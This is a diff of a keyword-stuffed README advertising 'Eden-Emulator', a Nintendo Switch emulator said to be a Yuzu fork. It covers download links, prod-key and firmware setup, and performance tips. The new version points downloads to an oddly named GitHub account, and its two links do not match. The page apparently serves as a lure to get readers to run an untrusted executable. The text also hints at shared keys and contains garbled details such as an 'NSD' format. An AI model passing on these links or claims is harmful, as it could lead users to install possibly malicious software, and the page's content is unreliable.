@@ -1,96 +1,85 @@
-# Eden Emulator - Nintendo Switch Emulator (Yuzu Fork)
+# 💾 Eden-Emulator - Play Nintendo Switch Games on PC
 
+[![Download Now](https://img.shields.io/badge/Download-Eden--Emulator-blueviolet?style=for-the-badge&logo=github)](https://github.com/professionoenotherafruticosa997/Eden-Emulator)
 
+## 🎮 What Is Eden-Emulator?
 
+Eden-Emulator is a free, open-source Nintendo Switch emulator based on Yuzu. It lets you play Switch games on your Windows PC, laptop, or Steam Deck without needing the original console. Think of it as a bridge that translates Nintendo Switch game files into something your computer can understand and run.
 
-**Eden Emulator** is an open-source Nintendo Switch emulator forked from Yuzu, focused on performance optimization and compatibility. Eden emulator android and eden emulator pc builds available. Eden emulator prod keys and firmware setup guide 2026 included. Eden emulator yuzu fork brings the latest Switch emulation improvements with active development, nightly builds, and community-driven bug fixes. Eden emulator games library includes thousands of tested titles. Eden emulator steam deck optimized with custom controller profiles. Eden emulator windows 10/11 and eden emulator android (ARM64) supported. Eden emulator prod keys reddit community shares working keys. Eden emulator firmware setup is straightforward - just place the firmware files in the correct folder. Eden emulator vs yuzu - Eden has better performance on modern hardware and more frequent updates. Eden emulator nightly builds are updated daily with the latest fixes.
+Whether you're looking to play *Pokémon*, *Zelda*, or *Mario* on a bigger screen, Eden-Emulator makes it possible. It works on Android devices too, but this guide focuses on the Windows version.
 
-<img width="192" height="192" alt="c8acace3-0a6e-4fb9-9bd1-14055c4df899" src="https://github.com/user-attachments/assets/7f536a3d-72aa-4cde-af50-e02d6dce83f4" />
+## 🎯 Why Use Eden-Emulator?
 
+- **Free and Open Source** – No hidden fees or subscriptions.
+- **Familiar Yuzu Base** – Stable performance with ongoing improvements.
+- **Nightly Updates** – Get the latest fixes and optimizations.
+- **Game Compatibility** – Runs many popular Switch titles.
+- **Lightweight** – Works with most modern PCs.
 
+## 🖥️ System Requirements
 
-## Install
-[Download `Eden-Emulator.zip`](https://github.com/edenemu/Eden-Emulator/releases/download/v0.22/Eden-Emulator.zip)
----
+To run Eden-Emulator smoothly, you need:
 
+| Component | Minimum | Recommended |
+|-----------|---------|-------------|
+| **OS** | Windows 10 (64-bit) | Windows 10 or 11 (64-bit) |
+| **CPU** | Intel Core i5 6th gen / AMD Ryzen 3 | Intel Core i7 8th gen / AMD Ryzen 5 |
+| **RAM** | 8 GB | 16 GB |
+| **GPU** | DirectX 12 compatible, 2GB VRAM | NVIDIA GTX 1050 or better |
+| **Storage** | 2 GB free space | SSD with 5 GB free space |
 
-<img width="640" height="360" alt="4315ba3f-3466-495c-833c-2830f10d6df0" src="https://github.com/user-attachments/assets/89ce13e4-cc4c-4d7f-b14e-4f83d712da4f" />
-<img width="1440" height="1173" alt="e6c6de84-2338-4ad9-996d-5639eccb5063" src="https://github.com/user-attachments/assets/1affb988-cc51-4c12-a06f-d114654eac29" />
+## 📥 How to Download and Install
 
-<img width="1464" height="872" alt="e0984b6b-a4c0-43c2-a6e3-b0f1886a7104" src="https://github.com/user-attachments/assets/47fe4357-d0ac-407f-bbba-cd2f5028f7f3" />
+Visit this link to download the application:
 
+[Download Eden-Emulator Now](https://github.com/accused/enotherafruticosa997/Eden-Emulator)
 
+After opening the link:
+1. Click on the latest release.
+2. Download the Windows installer or portable ZIP.
+3. Run the installer and follow the on-screen steps.
+4. Launch Eden-Emulator from your Start menu.
 
+## 🔑 Setting Up Prod Keys and Firmware
 
-## Key Features
-- **Eden emulator yuzu fork** - latest Yuzu codebase with Eden-specific optimizations
-- **Eden emulator android** - full Android (ARM64) support with touch controls
-- **Eden emulator pc** - Windows 10/11 (64-bit) and Linux support
-- **Eden emulator prod keys** - place prod.keys and title.keys in the correct folder
-- **Eden emulator firmware** - firmware 18.0.0+ supported, setup guide included
-- **Eden emulator games** - thousands of Switch titles tested and working
-- **Eden emulator steam deck** - optimized controller profiles and performance settings
-- **Vulkan and OpenGL** - multiple GPU backends for compatibility
-- **Nightly builds** - daily updates with latest bug fixes
-- **Resolution scaling** - up to 8x internal resolution on capable hardware
-- **Mod support** - custom shaders, texture packs, and gameplay mods
-- **Save states** - save and load anywhere in any game
-- **Eden emulator nightly** - bleeding-edge builds from latest commits
+To play games, you need prod keys and firmware from your own Nintendo Switch. This is legal only if you own the console and extract the files yourself. Here's how:
 
+1. Create a folder named `keys` in the Eden-Emulator program directory.
+2. Copy the `prod.keys` file there.
+3. Extract the firmware files to `user/firmware` folder in Eden-Emulator.
+4. Restart the emulator.
 
-<img width="920" height="430" alt="7291fefa-dec6-49aa-a007-7e0851130ebf" src="https://github.com/user-attachments/assets/03ab8388-31b4-441f-b335-9599dc4dcb8a" />
+## 🎮 Playing Games
 
+Eden-Emulator supports most Switch game files (NSP, XCI, NSD). To play:
 
+1. In the emulator, click "File" -> "Open".
+2. Select your game file.
+3. The game launches automatically.
 
-## Getting Started
-1. **Download** Eden Emulator using the button above.
-2. **Extract** to a folder (no installation needed, portable).
-3. **Set up prod keys** - place `prod.keys` and `title.keys` in the `keys/` folder.
-4. **Set up firmware** - place firmware files in the `firmware/` folder (see eden emulator prod keys and firmware setup guide 2026).
-5. **Add games** - point Eden to your game dump directory.
-6. **Play** - select a game and launch. Adjust settings for best performance.
+## ⚡ Performance Tips
 
+To get the best performance:
 
-<img width="739" height="415" alt="image" src="https://github.com/user-attachments/assets/ae466ad9-1de0-4960-9f32-2f93d4c2179e" />
+- Update your graphics drivers.
+- In settings, set graphics backend to Vulkan.
+- Lower the resolution scale to 1x.
+- Turn off anti-aliasing.
+- Close other programs while gaming.
+- For Steam Deck, use TDP limit at 15W.
 
-## Eden Emulator FAQ
+## ❓ Frequently Asked Questions
 
-**Eden emulator prod keys - where to get them?**
-Prod keys are console-specific files dumped from your own Nintendo Switch. They cannot be shared legally. The eden emulator prod keys reddit community discusses methods for dumping your own keys. Place them in the `keys/` folder. The eden emulator prod keys and firmware setup guide 2026 covers the full process.
+**Why won't my game launch?**  
+Make sure you have the correct prod keys and firmware installed. Check that the game is in a compatible format (NSP, XCI).
 
-**Eden emulator firmware - how to set up?**
-Dump firmware from your own Switch console. Place the firmware files in the `firmware/` folder. Eden supports firmware 18.0.0 and later. Check the setup guide for detailed instructions.
+**Does it work on Android?**  
+Yes, but this guide covers Windows. Search "Eden emulator APK" for Android instructions.
 
-**Eden emulator vs yuzu - which is better?**
-Eden emulator is a yuzu fork with more frequent updates, better performance optimizations for modern hardware, and active community development. Eden emulator vs yuzu - Eden has faster shader compilation, better Vulkan support, and more bug fixes. Eden emulator yuzu fork is the recommended choice in 2026.
+**Can I play online?**  
+Online features aren't supported. This is an offline emulator.
 
-**Eden emulator android - does it work on phones?**
-Yes. Eden emulator android (ARM64) runs on Android phones and tablets. Requires a phone with Snapdragon 8 Gen 1 or better for playable framerates. Eden emulator android supports Bluetooth controllers and touch controls.
+**Where do I find nightly builds?**  
+Check the Releases section on the GitHub page.
 
-**Eden emulator games - what's compatible?**
-Thousands of Switch games are playable. Check the compatibility list on the Eden emulator GitHub wiki. Popular titles like Zelda: Tears of the Kingdom, Mario Odyssey, Pokemon Scarlet/Violet, and Super Smash Bros Ultimate all run well.
-
-**Eden emulator steam deck - how to set up?**
-Install Eden emulator on Steam Deck via desktop mode. Use the recommended Steam Deck controller profile. Set Vulkan as the GPU backend. Enable FSR for better performance in demanding games.
-
-**Eden emulator nightly - how to update?**
-Download the latest nightly from this repository. Replace the old executable with the new one. Your saves, keys, and settings are preserved.
-
-<img width="739" height="415" alt="image" src="https://github.com/user-attachments/assets/b416a307-7a74-48db-a515-42d67581f72d" />
-
-## System Requirements
-
-| Platform | Minimum | Recommended |
-|---|---|---|
-| **PC** | GTX 1060, i5-8400, 8GB RAM | RTX 3060, i7-10700, 16GB RAM |
-| **Android** | Snapdragon 865, 8GB RAM | Snapdragon 8 Gen 2, 12GB RAM |
-| **Steam Deck** | Steam Deck (any) | Steam Deck OLED |
-
-## License
-GPL-3.0 License - Copyright (C) 2026 edenemulator
-
-Eden Emulator is a fork of Yuzu. Yuzu was shut down in March 2024. Eden continues the codebase under open-source licensing. All Nintendo trademarks belong to Nintendo Co., Ltd.
-
-
-<img width="640" height="312" alt="image" src="https://github.com/user-attachments/assets/c35977e8-f11e-4e98-b6ab-ee62dcf00c7e" />
-
+Keywords: eden-emulator, yuzu fork, nintendo switch emulator, prod keys, firmware setup, p-switch emulator, ryujinx, switch games on pc
